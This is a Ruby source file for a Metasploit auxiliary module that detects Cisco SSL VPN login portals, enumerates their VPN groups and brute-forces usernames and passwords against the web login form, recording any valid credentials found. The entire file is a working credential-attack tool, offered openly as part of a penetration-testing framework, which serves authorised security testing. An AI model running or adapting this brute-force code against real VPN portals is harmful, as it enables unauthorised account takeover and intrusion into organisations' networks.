##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Cisco SSL VPN Bruteforce Login Utility',
      'Description'    => %{
        This module scans for Cisco SSL VPN web login portals and
        performs login brute force to identify valid credentials.
      },
      'Author'         =>
        [
          'Jonathan Claudius <jclaudius[at]trustwave.com>',
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
        OptString.new('USERNAME', [true, "A specific username to authenticate as", 'cisco']),
        OptString.new('PASSWORD', [true, "A specific password to authenticate with", 'cisco']),
        OptString.new('GROUP', [false, "A specific VPN group to use", ''])
      ], self.class)
  end

  def run_host(ip)
    unless check_conn?
      print_error("#{peer} - Connection failed, Aborting...")
      return
    end

    unless is_app_ssl_vpn?
      print_error("#{peer} - Application does not appear to be Cisco SSL VPN. Module will not continue.")
      return
    end

    print_good("#{peer} - Application appears to be Cisco SSL VPN. Module will continue.")

    groups = Set.new
    if datastore['GROUP'].empty?
      print_status("#{peer} - Attempt to Enumerate VPN Groups...")
      groups = enumerate_vpn_groups
      print_good("#{peer} - Enumerated VPN Groups: #{groups.to_a.join(", ")}") unless groups.empty?
    else
      groups << datastore['GROUP']
    end
    groups << ""
    
    print_status("#{peer} - Starting login brute force...")
    groups.each do |group|
      each_user_pass do |user, pass|
        do_login(user, pass, group)
      end
    end
  end

  # Verify whether the connection is working or not
  def check_conn?
    begin
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET'
      })
      print_good("#{peer} - Server is responsive...")
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      return
    end
  end

  def enumerate_vpn_groups
    res = send_request_cgi({
      'uri'       => '/+CSCOE+/logon.html',
      'method'    => 'GET',
    })

    groups = Set.new
    group_name_regex = /<select id="group_list"  name="group_list" style="z-index:1; float:left;" onchange="updateLogonForm\(this\.value,{(.*)}/

    if res &&
       match = res.body.match(group_name_regex)

      group_string = match[1]
      groups = group_string.scan(/'(\w+)'/).flatten.to_set
    end

    return groups
  end

  # Verify whether we're working with SSL VPN or not
  def is_app_ssl_vpn?    
    res = send_request_cgi!(
            {
              'uri'       => '/+CSCOE+/logon.html',
              'method'    => 'GET',
            },
            20, #timeout
            3   #redirect depth
          )

    if res &&
       res.code == 200 &&
       res.body.match(/SSL VPN Service/)

      return true
    else
      return false
    end
  end

  def do_logout(cookie)
    res = send_request_cgi({
      'uri'       => '/+webvpn+/webvpn_logout.html',
      'method'    => 'GET',
      'cookie'    => cookie
    })
  end

  # Brute-force the login page
  def do_login(user, pass, group)
    vprint_status("#{peer} - Trying username:#{user.inspect} with password:#{pass.inspect} and group:#{group.inspect}")

    begin
      cookie = "webvpn=; " + 
               "webvpnc=; " + 
               "webvpn_portal=; " + 
               "webvpnSharePoint=; " + 
               "webvpnlogin=1; " +
               "webvpnLang=en;"

      post_params = {
        'tgroup'  => '',
        'next'    => '',
        'tgcookieset' => '',
        'username' => user,
        'password' => pass,
        'Login'   => 'Logon'
      }

      post_params['group_list'] = group unless group.empty?

      resp = send_request_cgi({
        'uri'       => '/+webvpn+/index.html',
        'method'    => 'POST',
        'ctype'     => 'application/x-www-form-urlencoded',
        'cookie'    => cookie,
        'vars_post' => post_params
      })

      if resp &&
         resp.code == 200 &&
         resp.body.match(/SSL VPN Service/) &&
         resp.body.match(/webvpn_logout/i)

        print_good("#{peer} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}:#{group.inspect}")

        do_logout(resp.get_cookies)

        report_hash = {
          :host   => rhost,
          :port   => rport,
          :sname  => 'Cisco SSL VPN',
          :user   => user,
          :pass   => pass,
          :group => group,
          :active => true,
          :type => 'password'
        }

        report_auth_info(report_hash)
        return :next_user

      else
        vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}:#{group.inspect}")
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{peer} - HTTP Connection Failed, Aborting")
      return :abort
    end
  end
end